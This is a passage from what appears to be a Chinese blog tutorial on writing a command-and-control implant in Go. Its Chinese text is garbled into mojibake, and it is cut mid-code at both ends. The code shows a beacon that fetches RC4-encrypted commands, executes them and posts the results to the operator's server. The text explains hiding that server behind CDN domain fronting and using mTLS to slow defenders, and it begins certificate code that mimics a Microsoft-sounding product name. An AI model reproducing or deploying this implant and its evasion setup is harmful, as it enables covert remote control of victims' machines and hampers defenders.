class="keyword">if</span> <span class="built_in">len</span>(matches) &lt; <span class="number">2</span> &#123;  </span><br><span class="line">          <span class="built_in">println</span>(<span class="string">&quot;No command found in response&quot;</span>)  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// å»é™¤ç©ºæ ¼ï¼Œè§£å¯†å‘½ä»¤  </span></span><br><span class="line">       encryptedCommand := strings.TrimSpace(<span class="type">string</span>(matches[<span class="number">1</span>]))  </span><br><span class="line">       command, err := utils.RC4Crypt([]<span class="type">byte</span>(encryptedCommand), beaconProfile.EncryptKey) <span class="comment">// ç»“æœï¼šipconfig  </span></span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Printf(<span class="string">&quot;rc4 crypt error:%v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="built_in">println</span>(<span class="string">&quot;Command:&quot;</span>, command)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// æ‰§è¡Œå‘½ä»¤å¹¶è¿”å›ç»“æœ  </span></span><br><span class="line">       result, err := runCommand(<span class="type">string</span>(command))  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Printf(<span class="string">&quot;run command error:%v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="built_in">println</span>(result)  </span><br><span class="line">       HttpPost(metaData, []<span class="type">byte</span>(result))  </span><br><span class="line">       time.Sleep(time.Duration(heartBeat.Sleep+heartBeat.Jitter) * time.Second)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runCommand</span><span class="params">(cmdLine <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> cmd *exec.Cmd  </span><br><span class="line">    <span class="comment">// æŒ‰ç©ºæ ¼æ‹†æˆ argvï¼Œæ”¯æŒå¸¦å‚æ•°  </span></span><br><span class="line">    args := strings.Fields(cmdLine)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;empty command&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    cmd = exec.Command(args[<span class="number">0</span>], args[<span class="number">1</span>:]...)  </span><br><span class="line">    out, err := cmd.CombinedOutput()  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(out), err  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>main</code> æ–¹æ³•æ˜¯ä¸€ä¸ªå…¸å‹çš„å¾ªç¯æ‹‰å–ä»»åŠ¡ï¼ˆè½®è¯¢ï¼Œå³Beaconæ¨¡å¼ï¼‰ï¼Œæ‰§è¡Œä»»åŠ¡ï¼Œè¿”å›ç»“æœçš„ç»“æ„ï¼Œåœ¨CSçš„Beaconçš„æºç ä¸­å®ƒä¹Ÿæ˜¯è¿™æ ·å®šä¹‰ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/11/20-01-51-b3fd3be299aee747a2034b6aaf2c2595-20250911200150-2aff57.png"></p>
<p><code>main</code> å‡½æ•°çš„åŠŸèƒ½å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡ <code>HttpGet</code> æ–¹æ³•å»æ‹‰å–ä»»åŠ¡ï¼Œä½¿ç”¨æ­£åˆ™æå–htmlä¸­åŠ å¯†çš„ä»»åŠ¡æ•°æ®ï¼Œè§£å¯†æ•°æ®ï¼Œç„¶åè°ƒç”¨ <code>runCommand</code> å»æ‰§è¡Œä»»åŠ¡ï¼ˆ<strong>æœ¬æ–‡ä¸­åªèƒ½æ‰§è¡Œcmdå‘½ä»¤</strong>ï¼‰ï¼Œæœ€åå°†æ‰§è¡Œçš„ç»“æœç”¨ <code>HttpPost</code> æ–¹æ³•å›ä¼ ç»™Serverã€‚</p>
<p>è·å–metadataã€RC4åŠ å¯†çš„ç­‰å·¥å…·å‡½æ•°å°±ä¸è¿‡å¤šä»‹ç»äº†ï¼Œå„ä½å¸ˆå‚…å¯ä»¥å»githubæŸ¥é˜…æºç ã€‚</p>
<h2 id="1-3-æµé‡åˆ†æ"><a href="#1-3-æµé‡åˆ†æ" class="headerlink" title="1.3 æµé‡åˆ†æ"></a>1.3 æµé‡åˆ†æ</h2><p>æœ€åæ¥çœ‹çœ‹æµé‡åˆ†æ</p>
<p>Beaconä»¥GETæ–¹å¼è¯·æ±‚ä»»åŠ¡</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/12-55-19-b8929b39fcd26efe41a8ad725031c686-20250907125518-f24ef8.png"></p>
<p>Serverè¿”å›ä»»åŠ¡æ•°æ®</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/12-55-51-04b0028889dd0fff9e18b678ea9db7c4-20250907125550-da1ddd.png"></p>
<p>Beaconå›ä¼ æ‰§è¡Œç»“æœ</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/12-56-25-ffaae8c9f976d2de09e54ada89c87849-20250907125625-332032.png"></p>
<p>ServeræˆåŠŸæ¥æ”¶ï¼Œè¿”å›å“åº”ç 200</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/12-57-13-7d65ced264fcb6c3e43c1e5bf7913db0-20250907125712-d55365.png"></p>
<h2 id="1-4-åŸŸå‰ç½®"><a href="#1-4-åŸŸå‰ç½®" class="headerlink" title="1.4 åŸŸå‰ç½®"></a>1.4 åŸŸå‰ç½®</h2><p>åŸŸå‰ç½®ï¼ˆDomain Frontingï¼‰æ˜¯ä¸€ç§åˆ©ç”¨HTTPSå’ŒCDNçš„ç½‘ç»œæŠ€æœ¯ï¼Œå…¶æ ¸å¿ƒç†å¿µæ˜¯åœ¨ç½‘ç»œé€šä¿¡ä¸­éšè—çœŸå®çš„é€šä¿¡ç›®çš„åœ°ï¼Œæ­¤é¡¹æŠ€æœ¯å¯è¢«ç”¨äºéšè—vpsçš„çœŸå®å…¬ç½‘IPåœ°å€ã€‚</p>
<p>å¾ˆå¤šäº‘æœåŠ¡å‚å•†éƒ½ä¼šæä¾›CDNåŠ é€ŸæœåŠ¡ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿æˆ‘å°±åœ¨é˜¿é‡Œäº‘ä¸Šå¼€é€šCDNæœåŠ¡ï¼Œæ¯•ç«Ÿä¹Ÿä¸è¦é’±ï¼Œå½“ç„¶åœ¨å®æˆ˜ä¸­ä¸æ¨èä½¿ç”¨å›½å†…çš„äº‘å‚å•†ï¼Œé“ç†å¤§å®¶éƒ½æ‡‚å§ï¼Ÿ</p>
<p>ç½‘ä¸Šæœ‰å¾ˆå¤šå‚è€ƒèµ„æ–™ï¼Œæˆ‘æ„Ÿè§‰æ²¡æœ‰å¿…è¦å†è¿™é‡Œå†å†™è¯¦ç»†æ­¥éª¤äº†ï¼Ÿçœ‹æˆ‘ç»™çš„è¿™ä¸¤ç¯‡å‚è€ƒèµ„æ–™å†åŠ ä¸Šé˜¿é‡Œäº‘çš„å®˜æ–¹æ–‡æ¡£å°±æ²¡é—®é¢˜äº†</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12070">C2éšåŒ¿-äº‘å‡½æ•°&amp;åŸŸå‰ç½®-å…ˆçŸ¥ç¤¾åŒº</a></li>
<li><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cqm7qf90lnec5jjug7b0">æµé‡å¯¹æŠ—-åŸŸå‰ç½®åŸºç¡€è®¾æ–½æ­å»º | é•¿äº­ç™¾å·äº‘</a></li>
</ol>
<p>æ‰€ä»¥æˆ‘ä»¬ç›´å…¥ä¸»é¢˜ï¼Œçœ‹çœ‹åŠ ä¸ŠåŸŸå‰ç½®æŠ€æœ¯åçš„æµé‡æ˜¯æ€ä¹ˆæ ·çš„å§ã€‚</p>
<p>ä¿®æ”¹beacon.goä¸­çš„æœåŠ¡å™¨çš„ <code>CallBackAddress</code> å­—æ®µçš„å€¼å¡«å†™ä¸º <code>CNAME</code> è®°å½•åŸŸåï¼Œæœ¬æ–‡ä¸­å°±æ˜¯ <code>www.abcplus.xyz</code>ï¼Œ å®ƒå¯ä»¥å°†ä¸€ä¸ªåŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåã€‚ä¸¾ä¸ªä¾‹å­å°±æ˜¯ <code>www.abcplus.xyzï¼ˆè®°å½•åŸŸåï¼‰</code> -&gt; <code>www.abcplus.xyz.queniuaa.comï¼ˆè®°å½•å€¼ï¼Œé…ç½®CNDæ—¶è‡ªåŠ¨ç”Ÿæˆï¼‰</code>ï¼ŒCDNèŠ‚ç‚¹å†æ ¹æ®<strong>å›æºè§„åˆ™</strong>æŠŠæµé‡è½¬ç»™ä½ çš„VPSã€‚</p>
<p>æ¥ç‚¹çœŸå®çš„ï¼Œç›´æ¥ä¸Šæµé‡åˆ†æï¼</p>
<p>é¦–å…ˆBeaconå‘DNSæœåŠ¡å™¨å‘èµ·Aè®°å½•æŸ¥è¯¢<code>www.abcplus.xyz</code> å¯¹åº”çš„IPæ˜¯å¤šå°‘ï¼ŒéšåDNSæœåŠ¡å™¨è¿”å›æŸ¥è¯¢ipä¸º <code>155.102.4.176</code>ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-01-22-724d8e5a8cf0e09d90ab0e1afa894af6-20250912210122-6a16fb.png"></p>
<p>å¾ˆæ˜æ˜¾è¿™ä¸æ˜¯æˆ‘çš„vpsçš„ipåœ°å€ï¼Œä¸ä¿¡ï¼Ÿå°±æµ‹ä¸€ä¸‹ã€‚<code>155.102.4.176</code> æ˜¯é˜¿é‡Œäº‘ CDN çš„è¾¹ç¼˜èŠ‚ç‚¹ï¼Œä¸æ˜¯æºç«™ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-08-17-8dd7f3f481a8220d4e2aa3736f289ae8-20250912210817-d19b7d.png"></p>
<p><strong>çœ‹çœ‹wiresharkæµé‡åŒ…</strong><br>ç¬¬31-33å·åŒ…ï¼šæ ‡å‡†çš„TCPä¸‰æ¬¡æ¡æ‰‹ã€‚<br>ç¬¬34-34å·åŒ…ï¼šéšåBeaconä»¥<code>GET</code>æ–¹å¼è®¿é—®äº†&#x2F;cdn-cgi&#x2F;traceï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨ä»£ç ä¸­å®šä¹‰çš„ä¸Šçº¿æ‹‰å–ä»»åŠ¡åŒ…çš„æ“ä½œã€‚<br>ç¬¬35-36å·åŒ…ï¼šServerè¿”å›ä»»åŠ¡æ•°æ®ç»™Beaconã€‚<br>ç¬¬37-38å·åŒ…ï¼šBeaconä»¥<code>POST</code>æ–¹å¼è®¿é—®äº†&#x2F;cdn-cgi&#x2F;traceï¼Œè¿”å›æ‰§è¡Œçš„ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-11-53-6fc6626e54a1c9bbc80f6c807727ed28-20250912211153-77a9e2.png"></p>
<p>serveræ¥æ”¶åˆ°ç»“æœåŒ…ï¼Œè¾“å‡ºç»“æœåˆ°æ§åˆ¶å°ï¼Œæ²¡æœ‰å‡ºé”™å°±è¿”å›200å“åº”ç </p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-22-14-efa83fcf54c8d09c58ba1f2cc1481382-20250912212213-4e416f.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-31-59-e711f94db6012475511c757a224a6ca9-20250912213159-6fc7b9.png"></p>
<p>å¦‚æœä½ è§‰å¾—ä½¿ç”¨HTTPä¸å®‰å…¨ï¼Œä½ å¯ä»¥ä½¿ç”¨HTTPSåè®®ï¼Œæ¯•ç«Ÿä½¿ç”¨HTTPæ€»æ„Ÿè§‰åœ¨è£¸å¥”ï¼Œå…·ä½“æ€ä¹ˆé…ç½®CDNå¯ä»¥çœ‹æˆ‘ç»™çš„é‚£ä¸¤ç¯‡å‚è€ƒæ–‡ç« ã€‚</p>
<h1 id="äºŒã€mTLS"><a href="#äºŒã€mTLS" class="headerlink" title="äºŒã€mTLS"></a>äºŒã€mTLS</h1><h2 id="2-1-æ€è·¯æ„å»º"><a href="#2-1-æ€è·¯æ„å»º" class="headerlink" title="2.1 æ€è·¯æ„å»º"></a>2.1 æ€è·¯æ„å»º</h2><p>mTLSåœ¨æ ‡å‡†TLSçš„åŸºç¡€ä¸Šè¦æ±‚<strong>å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å„è‡ªå‡ºç¤ºå¹¶éªŒè¯å¯¹æ–¹æ•°å­—è¯ä¹¦</strong>ï¼Œå®ç°<strong>åŒå‘èº«ä»½è®¤è¯</strong>ï¼Œå¸¸ç”¨äºé›¶ä¿¡ä»»æ¡†æ¶ï¼Œå› ä¸ºåœ¨Sliverçš„ä»‹ç»ä¸­çœ‹åˆ°äº†è¿™ä¸ªåè®®ï¼Œæ‰€ä»¥å°±æƒ³æ ¹æ®Sliverçš„æºç æ¥åˆ†æä¸€æ³¢mTLSåœ¨C2ä¸­çš„åº”ç”¨ã€‚</p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼ˆmaybeï¼Ÿï¼‰ï¼Œå¯ä»¥é€šè¿‡TCP Socketå®ç°å®æ—¶ä¿¡æ¯é€šä¿¡é•¿è¿æ¥é€šé“ï¼Œè€Œä¸”æ¯ä¸ªæ“ä½œç³»ç»Ÿéƒ½ä¼šæä¾›ç›¸å…³çš„ç¼–ç¨‹APIï¼Œæ‰€ä»¥TCP Socketä¹Ÿæ˜¯C2ä¸­ç»å¸¸å‡ºç°çš„C2åè®®ï¼Œåœ¨TCPçš„ä¸Šå±‚å¥—ä¸€ä¸ªTLS&#x2F;SSLå³å¯å®ŒæˆåŠ å¯†é€šä¿¡ã€‚è€ŒmTLSåªæ˜¯åœ¨TLSçš„åŸºç¡€ä¸Š<strong>è¦æ±‚clientä¹Ÿå‡ºç¤ºå…¶TLSè¯ä¹¦</strong>ï¼Œå½“ç„¶åœ¨C2ä¸­è¿™ä¹ˆåšçš„ç›®çš„æ›´å¤šæ˜¯é˜²æ­¢é˜²å®ˆæ–¹é€šè¿‡ä¼ªè£…TLSè¯ä¹¦ä¸æœåŠ¡å™¨é€šä¿¡ã€‚ä½†æ˜¯è¿™æ ·å¹¶éå®Œå…¨å®‰å…¨ï¼ŒæŒ‰ç…§sliverçš„åšæ³•æ˜¯å°†CAè¯ä¹¦ã€clientç§é’¥ã€clientè¯ä¹¦é©»ç•™åœ¨Beaconçš„å†…å­˜ä¸­ï¼Œå¦‚æœé˜²å®ˆæ–¹èƒ½ä»å…¶å†…å­˜ä¸­dumpå‡ºè¿™ä¸‰ä¸ªå‡­æ®ï¼Œä¹Ÿå°±èƒ½é‡å¤å·²æœ‰èº«ä»½ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨mTLSçš„ç›®çš„æ˜¯è¿›ä¸€æ­¥å»¶ç¼“é˜²å®ˆæ–¹çš„åˆ†æé€Ÿåº¦ï¼Œè€Œéå®Œå…¨é˜»æ­¢ã€‚ä½¿ç”¨mTlsåè®®éœ€è¦ç®€å•äº†è§£ä¸€ä¸‹è¯ä¹¦çš„<strong>ç­¾å‘</strong>ä¸<strong>éªŒè¯</strong>æµç¨‹ã€‚</p>
<p>çœ‹ä¸€ä¸‹<strong>ç­¾å‘</strong>ï¼ˆç§æœ‰PKIæ„å»ºï¼‰çš„æµç¨‹ï¼š</p>
<ol>
<li>Serverç”Ÿæˆä¸€æŠŠç§é’¥ä½œä¸ºCAçš„ç§é’¥ï¼ŒCAç§é’¥å­˜æ”¾åœ¨Serverçš„å†…å­˜æˆ–æ•°æ®åº“ä¸­</li>
<li>å¼„å‡ºä¸€ä¸ªCAè¯ä¹¦æ¨¡æ¿</li>
<li>ç„¶åCAçš„ç§é’¥å¯¹CAè¯ä¹¦ç­¾åï¼Œå³è‡ªç­¾</li>
<li>Serverç”Ÿæˆä¸ºListenerç”Ÿæˆä¸€å¯¹ç§é’¥å’Œå…¬é’¥</li>
<li>ç”¨CAçš„ç§é’¥å¯¹Listenerçš„å…¬é’¥ç­¾åï¼Œç”ŸæˆListenerçš„è¯ä¹¦</li>
<li>Serverä¸ºBeaconç”Ÿæˆä¸€å¯¹ç§é’¥å’Œå…¬é’¥</li>
<li>ç”¨CAçš„ç§é’¥å¯¹Beaconçš„è¯ä¹¦ç­¾åï¼Œç”ŸæˆBeaconçš„è¯ä¹¦</li>
</ol>
<p>å†çœ‹ä¸€ä¸‹<strong>éªŒè¯</strong>æµç¨‹ï¼Œå…¶ä¸­åŠ ç²—çš„éƒ¨åˆ†å°±æ˜¯ä¸TLSä¸åŒçš„åœ°æ–¹ã€‚</p>
<ol>
<li>å®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡å™¨</li>
<li>æœåŠ¡å™¨å‡ºç¤ºå…¶TLSè¯ä¹¦</li>
<li>å®¢æˆ·ç«¯ä½¿ç”¨å†…ç½®çš„CAè¯ä¹¦ï¼ˆç›¸å½“äºæ ¹è¯ä¹¦ï¼‰éªŒè¯æœåŠ¡å™¨çš„è¯ä¹¦</li>
<li><strong>å®¢æˆ·ç«¯å‡ºç¤ºå…¶ TLS è¯ä¹¦</strong></li>
<li><strong>æœåŠ¡å™¨ä½¿ç”¨å†…ç½®çš„CAè¯ä¹¦éªŒè¯å®¢æˆ·ç«¯çš„è¯ä¹¦</strong></li>
<li><strong>æœåŠ¡å™¨æˆäºˆè®¿é—®æƒé™</strong></li>
<li>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šè¿‡åŠ å¯†çš„TCP Socketè¿æ¥äº¤æ¢ä¿¡æ¯</li>
</ol>
<p>äº†è§£ä¸Šè¿°çš„çŸ¥è¯†ç‚¹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ€è·¯æ„å»ºäº†</p>
<p><strong>ç¬¬ä¸€ç‚¹ï¼šè‡ªå·±ç”ŸæˆCAè¯ä¹¦</strong>ï¼šè¿™éƒ¨åˆ†æ˜¯å¯¹åº”<strong>ç­¾å‘æµç¨‹</strong>çš„å› ä¸ºæ ¹æœ¬å°±æ‹¿ä¸åˆ°å…·æœ‰å…¬è¯åŠ›çš„CAç§é’¥ï¼Œè€Œä¸”ä¹Ÿæ²¡å¿…è¦ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨çš„CAè¯ä¹¦ä¸æ˜¯ç³»ç»Ÿä¿¡ä»»çš„æ ¹è¯ä¹¦ï¼Œè€Œæ˜¯å®Œå…¨ç§æœ‰çš„ï¼Œä¸ºäº†æ„å»ºé›¶ä¿¡ä»»æ¡†æ¶ï¼Œå®ƒè®©ä½ æ‹¥æœ‰â€œç­¾å‘èº«ä»½â€çš„ä¸»æƒï¼Œæ‰€ä»¥éœ€è¦å¦¥å–„ä¿ç®¡å¥½CAç§é’¥ã€‚</p>
<p><strong>ç¬¬äºŒç‚¹ï¼šä¸ºæ¯ä¸€ä¸ªæ–°è¿æ¥å¯åŠ¨ä¸€ä¸ªgoroutine</strong>ï¼šè®©æ¯æ¡æ¯æ¡è¿æ¥éš§é“â€œç‹¬äº«â€ä¸€æ¡è½»é‡çº§æ‰§è¡Œæµï¼Œæ—¢è§£è€¦åˆé˜²é˜»å¡ï¼Œæ˜¯åˆ©ç”¨Goåœ¨å¹¶å‘ä¼˜åŠ¿å†™C2çš„æ ‡é…å¥—è·¯ã€‚</p>
<p><strong>ç¬¬ä¸‰ç‚¹ï¼šæµé‡åˆ†å¸§</strong>ï¼šè¿™ä¸€ç‚¹æ˜¯é’ˆå¯¹å¤§æ–‡ä»¶ã€å¤§æ•°æ®çš„æƒ…å†µã€‚ä¸ºäº†é¿å…é€šä¿¡åŒæ–¹å‘é€è¶…é•¿çš„æ•°æ®å¯¼è‡´ç²˜åŒ…ï¼Œé€šå¸¸çš„åšæ³•æ˜¯å‘é€æ–¹å…ˆå‘é€æ€»é•¿åº¦ç»™æ¥æ”¶æ–¹ï¼Œç„¶åæ¥æ”¶æ–¹ç”³è¯·ä¸€ä¸ªæ€»é•¿åº¦å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œä¹‹åå†ä»socketè¯»å–æ•°æ®ï¼Œå°±å¯ä»¥é¿å…ç²˜åŒ…ç°è±¡çš„å‡ºç°ã€‚</p>
<p>å¦‚æœä½ æœ‰å¤§æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½çš„éœ€æ±‚ä¸”æœ‰è½åœ°ç£ç›˜çš„åœºæ™¯ï¼Œå¹¶ä¸èƒ½ç›´æ¥å°†æ•°æ®è¯»åˆ°å†…å­˜åœ¨å†™å…¥åˆ°ç£ç›˜ä¸Šï¼Œå®¹æ˜“é€ æˆå†…å­˜çˆ†ç‚¸ï¼Œæ‰€ä»¥åœ¨å®é™…ç¼–ç¨‹ä¸­ï¼Œä½ å°±éœ€è¦å®ç°å›ºå®šå­—èŠ‚â€œåˆ†å—â€è½ç›˜ã€‚æˆ‘åªæ˜¯åœ¨è¿™é‡Œæä¸Šä¸€å˜´ï¼Œä»£ç åªè§£å†³äº†ç²˜åŒ…é—®é¢˜ï¼Œå› æœ¬æ–‡æ²¡æœ‰â€œåˆ†å—â€è½ç›˜çš„åœºæ™¯æ‰€ä»¥å°±æ²¡å®ç°ã€‚</p>
<p>ä¸ºä»€ä¹ˆhttpä¸éœ€è¦åˆ†å¸§ï¼Ÿå…¶å®ä¸æ˜¯ä¸åˆ†ï¼Œè€Œæ˜¯å¸§å·²ç»è¢«åè®®è§„èŒƒåšå®Œï¼Œå¼€å‘è€…æ— æ„Ÿï¼Œåé¢çš„å¾ˆå¤šC2åè®®éƒ½éœ€è¦å¼€å‘è€…è‡ªè¡Œåˆ†å¸§ï¼Œåˆ†ç»„ï¼ˆåˆ†å¸§ã€åˆ†ç‰‡ã€åˆ†æ®µæ˜¯ä¸€ä¸ªæ„æ€ï¼‰ æ˜¯c2ä¸­ç»•ä¸å¼€çš„ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ã€‚</p>
<p><strong>ç¬¬äº”ç‚¹ï¼šå‘½ä»¤ä¸‹å‘ä¸ç»“æœå›ä¼ </strong>ï¼šæˆ‘ä»¬çš„ä¸‹å‘ä»»åŠ¡å’ŒBeaconç»“æœéƒ½æ˜¯æ•°æ®ï¼Œå¯é€šè¿‡socketä¼ è¾“ã€‚</p>
<p>å½“BeaconæˆåŠŸè¿æ¥åˆ°Serverï¼Œå°±å‘é€ä¸€ä¸ªå¿ƒè·³åŒ…ç”¨äºåç»­çš„æ³¨å†Œæ“ä½œã€‚å› ä¸ºæœ¬æ–‡ä¸­æ˜¯å®ç°äº†ä¸€ä¸ªé•¿è¿æ¥å®æ—¶sessionä¼šè¯ï¼Œä¸‹å‘çš„ä»»åŠ¡ä¼šç«‹å³æœ‰æ‰§è¡Œï¼Œæ‰€ä»¥ä¸éœ€è¦ä»»åŠ¡é˜Ÿåˆ—å­˜å‚¨ä»»åŠ¡æ•°æ®ã€‚</p>
<p>å½“ç„¶æ­¤c2åè®®ä¹Ÿèƒ½å¤Ÿå®ç°Beaconæ¨¡å¼ï¼Œä»»åŠ¡ä¸ç«‹å³è¢«beaconå–èµ°ï¼Œæ‰€ä»¥å¯ä»¥å‡†å¤‡ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ã€‚</p>
<h2 id="2-2-ä»£ç å®ç°"><a href="#2-2-ä»£ç å®ç°" class="headerlink" title="2.2 ä»£ç å®ç°"></a>2.2 ä»£ç å®ç°</h2><h3 id="2-2-1-ç”Ÿæˆè¯ä¹¦"><a href="#2-2-1-ç”Ÿæˆè¯ä¹¦" class="headerlink" title="2.2.1 ç”Ÿæˆè¯ä¹¦"></a>2.2.1 ç”Ÿæˆè¯ä¹¦</h3><p><code>cert.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//go:build ignore  </span></span><br><span class="line"><span class="comment">// +build ignore  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;crypto/ecdsa&quot;</span>  </span><br><span class="line">    <span class="string">&quot;crypto/elliptic&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/rand&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/x509&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/x509/pkix&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/pem&quot;</span>    </span><br><span class="line">    <span class="string">&quot;math/big&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;time&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// å›ºå®šç»„ç»‡å  </span></span><br><span class="line"><span class="keyword">var</span> orgName = <span class="string">&quot;System Center Operations Manager&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ç”Ÿæˆç§é’¥å’Œè¯ä¹¦ï¼Œå¹¶ç”¨è‡ªå·±çš„ç§é’¥ç­¾å‘è‡ªå·±çš„è¯ä¹¦ï¼ˆè‡ªç­¾ï¼‰  </span></span><br><span class="line">    caPriv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)  </span><br><span class="line">    caTmpl := &amp;x509.Certificate&#123;  </span><br><span class="line">       SerialNumber: <span class="built_in">new</span>(big.Int).SetBytes(randomBytes(<span class="number">20</span>)),  </span><br><span class="line">       Subject: pkix.Name&#123;  </span><br><span class="line">          Organization:  []<span class="type">string</span>&#123;orgName&#125;,  </span><br><span class="line">          Country:       []<span class="type">string</span>&#123;<span class="string">&quot;US&quot;</span>&#125;,  </span><br><span class="line">          Province:      []<span class="type">string</span>&#123;<span class="string">&quot;&quot;</span>&#125;,  </span><br><span class="line">          Locality:      []<span class="type">string</span>&#123;<span class="string">&quot;Redmond&quot;</span>&#125;, <span class="comment">// éšä¾¿å†™  </span></span><br><span class="line">          StreetAddress: []<span class="type">string</span>&#123;<span class="string">&quot;&quot;</span>&#125;,  </span><br><span class="line">          PostalCode:    []<span class="type">string</span>&#123;<span class="string">&quot;&quot;</span>&#125;,  </span><br><span class="line">       &#125;,  </span><br><span class="line">       NotBefore: time.Now(), NotAfter: time.Now().AddDate(<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>),  </span><br><span class="line">       KeyUsage: x509.KeyUsageCertSign, BasicConstraintsValid: <span class="literal">true</span>,  </span><br><span class="line">       IsCA: <span 